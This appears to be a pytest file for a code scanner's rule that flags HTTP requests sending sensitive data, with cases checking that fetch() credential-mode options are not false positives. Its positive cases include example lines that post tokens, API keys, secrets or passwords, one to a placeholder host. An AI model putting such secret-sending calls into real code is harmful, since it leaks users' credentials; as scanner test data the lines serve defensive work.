"""fetch()'s `credentials` mode option is not a credential being sent (Next.js)."""
from __future__ import annotations

import pytest

from src.scanner.scan import _scan_content

NAME = "HTTP POST with sensitive data"


def _hits(line: str, path: str = "dist/server/x.js") -> list:
    return [f for f in _scan_content(line + "\n", path)[0] if f.name == NAME]


@pytest.mark.parametrize("line", [
    # next/dist/esm/server/stream-utils/node-web-streams-helper.js (inline script)
    "const s = `<script>__NEXT_CLIENT_RESUME=fetch(location.pathname+'?${q}',"
    "{credentials:'same-origin',headers:{'${RSC_HEADER}': '1'}})</script>`;",
    'fetch("/api/me", { credentials: "include" })',
    "fetch(url, {credentials: 'omit', method: 'GET'})",
    "fetch(u,{credentials:\\'same-origin\\'})",
])
def test_credentials_mode_option_alone_is_not_exfil(line):
    assert not _hits(line)


@pytest.mark.parametrize("line", [
    "fetch(url, {method: 'POST', credentials: 'include', body: token})",
    "fetch('https://x.example.test', {credentials: 'omit', body: JSON.stringify({apiKey})})",
    "fetch(u, {credentials: 'same-origin', headers: {Authorization: secret}})",
    "fetch(u, {credentials: myCreds})",
    "fetch(u, {body: credentials})",
    "requests.post(url, data={'password': pw})",
])
def test_real_sensitive_data_still_flagged(line):
    path = "x.py" if line.startswith("requests") else "dist/server/x.js"
    assert _hits(line, path)
